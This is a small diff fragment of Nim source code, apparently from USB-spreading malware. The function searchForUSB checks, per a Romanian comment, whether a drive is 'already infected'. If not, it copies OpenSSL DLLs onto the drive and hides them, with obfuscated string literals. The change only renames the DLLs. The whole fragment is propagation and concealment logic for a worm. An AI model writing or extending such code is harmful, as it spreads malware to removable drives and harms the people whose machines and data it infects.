@@ -288,12 +288,12 @@ proc searchForUSB(): void =
         ## $WinQuery
         ## $WinFind
         if not existsFile(dest): # daca ii deja infectat lasa l in pace
-          let ddl1Name: string = d e"libssl-1_1-x64.dll"
+          let ddl1Name: string = d e"libssl-1_1.dll"
           let ddl1Path: string = drivePath / ddl1Name
           copyFile(ddl1Name, ddl1Path)
           hideFile(ddl1Path)
 
-          let ddl2Name: string = d e"libcrypto-1_1-x64.dll"
+          let ddl2Name: string = d e"libcrypto-1_1.dll"
           let ddl2Path: string = drivePath / ddl2Name
           copyFile(ddl2Name, ddl2Path)
           hideFile(ddl2Path)
